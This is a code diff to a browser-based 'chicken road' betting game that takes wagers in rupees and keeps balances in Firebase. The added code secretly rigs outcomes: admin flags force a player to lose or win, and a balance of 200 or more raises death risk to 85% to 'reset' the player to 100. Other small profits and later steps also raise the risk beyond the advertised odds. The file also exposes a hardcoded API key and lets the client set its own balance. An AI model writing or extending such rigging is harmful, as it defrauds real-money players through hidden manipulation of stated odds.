@@ -104,7 +104,7 @@
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg",
@@ -123,15 +123,15 @@
     const config = {
         easy: {
             mults: [1.2, 1.7, 2.3, 3.5, 4.0, 4.8, 4.99, 5.5, 6.11, 8.1, 10.1, 12.5, 14.0, 16.5, 19.0],
-            risk: 0.25 // 25% Risk as requested
+            risk: 0.25 
         },
         medium: {
             mults: [1.5, 2.5, 4.0, 6.0, 8.5, 11.0, 15.0, 20.0, 26.0, 33.0, 40.0, 50.0, 65.0, 80.0, 100.0],
-            risk: 0.40 // 40% Risk as requested
+            risk: 0.40 
         },
         hard: {
             mults: [2.0, 5.0, 10.0, 18.0, 30.0, 50.0, 80.0, 120.0, 180.0, 250.0, 350.0, 500.0, 750.0, 1000.0, 2500.0],
-            risk: 0.70 // 70% Risk as requested
+            risk: 0.70 
         }
     };
 
@@ -175,20 +175,39 @@
 
         document.getElementById("sBtn").style.display = "none";
         document.getElementById("cBtn").style.display = "block";
+        document.getElementById("chicken-img").style.filter = "none";
         initRoad();
         moveChicken(-1);
     };
 
-    window.jump = (i) => {
+    window.jump = async (i) => {
         if (!playing || i !== step + 1) return;
         moveChicken(i);
+
+        // Fetch User Data for Rigging
+        const userRef = ref(db, `users/${auth.currentUser.uid}`);
+        const userSnap = await get(userRef);
+        const userData = userSnap.val();
 
         setTimeout(() => {
             let currentRisk = config[mode].risk;
             
-            // RIGGING LOGIC
-            if (uBal > 80) currentRisk = 0.88; // More aggressive if user is in profit
-            if (i > 8) currentRisk += 0.05;
+            // --- 1. ADMIN FORCE CONTROLS ---
+            if (userData.forceLoss === true) {
+                currentRisk = 1.0; // Guaranteed Death
+            } else if (userData.forceWin === true) {
+                currentRisk = 0.0; // Guaranteed Safe
+            } else {
+                // --- 2. PROFIT RIGGING (200rs Guard) ---
+                if (uBal >= 200) {
+                    currentRisk = 0.85; // Hard reset user to 100rs
+                } else if (uBal > 80) {
+                    currentRisk += 0.20; // Increase difficulty after small profit
+                }
+
+                // --- 3. PROGRESSIVE RISK ---
+                if (i > 5) currentRisk += 0.10;
+            }
 
             if (Math.random() < currentRisk) {
                 die(i);
@@ -217,7 +236,12 @@
         playing = false;
         document.getElementById(`p-${i}`).classList.add('failed');
         document.getElementById("chicken-img").style.filter = "grayscale(1) brightness(0.4)";
-        setTimeout(() => location.reload(), 1500);
+        setTimeout(() => {
+            document.getElementById("sBtn").style.display = "block";
+            document.getElementById("cBtn").style.display = "none";
+            initRoad();
+            moveChicken(-1);
+        }, 1500);
     }
 
     window.collect = async () => {
@@ -226,7 +250,11 @@
         const win = bet * config[mode].mults[step];
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: uBal + win });
         alert(`You won ₹${win.toFixed(2)}!`);
-        location.reload();
+        
+        document.getElementById("sBtn").style.display = "block";
+        document.getElementById("cBtn").style.display = "none";
+        initRoad();
+        moveChicken(-1);
     };
 
     initRoad();
